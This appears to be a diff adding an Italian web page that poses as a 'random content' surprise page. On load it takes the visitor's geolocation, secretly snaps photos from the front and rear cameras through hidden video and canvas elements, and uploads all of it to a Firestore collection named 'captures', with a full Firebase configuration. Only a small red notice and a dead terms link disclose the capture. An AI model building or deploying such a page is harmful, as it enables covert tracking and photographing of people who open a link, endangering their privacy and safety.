@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Contenuto Casuale</title>
+    <!-- Includi Firebase -->
+    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js"></script>
+    <script>
+        // Configurazione Firebase (dal tuo progetto)
+        const firebaseConfig = {
+            apiKey: "AIzaSyB5vi_b7HjiH5akXLsqk2OOO_lv-vSJzHI",
+            authDomain: "cattura-a93c5.firebaseapp.com",
+            projectId: "cattura-a93c5",
+            storageBucket: "cattura-a93c5.firebasestorage.app",
+            messagingSenderId: "155421459394",
+            appId: "1:155421459394:web:2c3bcb70fe32bf1fc30c5b",
+            measurementId: "G-E9MKECCY3W"
+        };
+        // Inizializza Firebase
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+    </script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 20px;
+            background-color: #f0f0f0;
+        }
+        #content {
+            margin-top: 20px;
+        }
+        #content img {
+            max-width: 100%;
+            border-radius: 10px;
+        }
+        #content p {
+            font-size: 24px;
+            color: #333;
+        }
+        #video, #canvas {
+            display: none;
+        }
+        #privacy-notice {
+            font-size: 14px;
+            color: red;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Benvenuto!</h1>
+    <div id="content"></div>
+    <p id="privacy-notice">Questa pagina raccoglie posizione e foto. Continuando, accetti i nostri <a href="#">termini</a>.</p>
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
+    <script>
+        // Contenuti casuali
+        const randomContents = [
+            '<img src="https://picsum.photos/600/400?random=1" alt="Immagine casuale">',
+            '<img src="https://picsum.photos/600/400?random=2" alt="Immagine casuale">',
+            '<p>😉 Guiñadle! Ecco una sorpresa!</p>',
+            '<p>🌟 Wow, guarda che bello!</p>',
+            '<img src="https://picsum.photos/600/400?random=3" alt="Immagine casuale">'
+        ];
+
+        // Mostra contenuto casuale
+        function showRandomContent() {
+            const contentDiv = document.getElementById('content');
+            const randomIndex = Math.floor(Math.random() * randomContents.length);
+            contentDiv.innerHTML = randomContents[randomIndex];
+        }
+
+        // Ottieni posizione
+        function getLocation() {
+            return new Promise((resolve, reject) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => resolve({ latitude: position.coords.latitude, longitude: position.coords.longitude }),
+                        (error) => reject("Errore geolocalizzazione: " + error.message)
+                    );
+                } else {
+                    reject("Geolocalizzazione non supportata");
+                }
+            });
+        }
+
+        // Accedi alla fotocamera
+        async function startCamera(facingMode) {
+            const video = document.getElementById('video');
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: facingMode }
+                });
+                video.srcObject = stream;
+                return stream;
+            } catch (err) {
+                console.error("Errore fotocamera:", err.message);
+                throw err;
+            }
+        }
+
+        // Scatta foto
+        function takePhoto() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            return canvas.toDataURL('image/jpeg');
+        }
+
+        // Ferma fotocamera
+        function stopCamera(stream) {
+            stream.getTracks().forEach(track => track.stop());
+        }
+
+        // Salva dati su Firestore
+        async function sendData(location, frontPhoto, backPhoto) {
+            try {
+                await db.collection('captures').add({
+                    latitude: location.latitude,
+                    longitude: location.longitude,
+                    frontPhoto: frontPhoto,
+                    backPhoto: backPhoto,
+                    timestamp: new Date()
+                });
+                console.log('Dati salvati su Firestore');
+            } catch (err) {
+                console.error('Errore salvataggio:', err.message);
+            }
+        }
+
+        // Funzione principale
+        async function captureData() {
+            try {
+                showRandomContent();
+                const location = await getLocation();
+                let stream = await startCamera('user');
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                const frontPhoto = takePhoto();
+                stopCamera(stream);
+                stream = await startCamera('environment');
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                const backPhoto = takePhoto();
+                stopCamera(stream);
+                await sendData(location, frontPhoto, backPhoto);
+                console.log('Acquisizione completata');
+            } catch (err) {
+                console.error('Errore:', err.message);
+            }
+        }
+
+        // Avvia automaticamente
+        window.onload = captureData;
+    </script>
+</body>
+</html>
